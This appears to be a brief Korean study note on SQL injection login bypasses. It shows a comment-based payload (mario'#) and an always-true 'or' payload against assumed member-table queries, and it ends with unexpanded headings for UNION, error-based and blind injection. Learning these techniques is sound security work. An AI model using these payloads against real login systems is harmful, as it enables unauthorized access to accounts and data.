# SQL Injection 공격 기법 정리

           

# 식별 & 인증 동시

가정한 query
```
select * from member where id='' and pass=''
```

## \# 
아이디에 주석처리할 수 있는 문구를 넣어 인증을 우회하는 방식.
```
id : mario'#
```
```
select * from member where id='mario'#' and pass='1234'
```

## or
or 논리 연산자를 id 입력칸에 넣어 논리 연산자의 우선순위를 이용해 공격하는 방식이다. 
```
id : mario'or'1'='1
```
```
select * from member where id='mario'or'1'='1' and pass='1234'
```
</br>
</br>
</br>

# 식별 & 인증 분리
가정한 query
```
select pass from member where id=''
```
가정한 password 유효성 검사 구문
```
if( db_pass == userinput_pass ){     
    로그인 성공    
}else      
```

## or
```
id : mario' or '1'='1
```
```
select pass from member where id='mario' or '1'='1'
```
→ 모든 데이터 출력
</br>
</br>
</br>




UNION SQLi   
Error Based SQLi   
Blind SQLi   
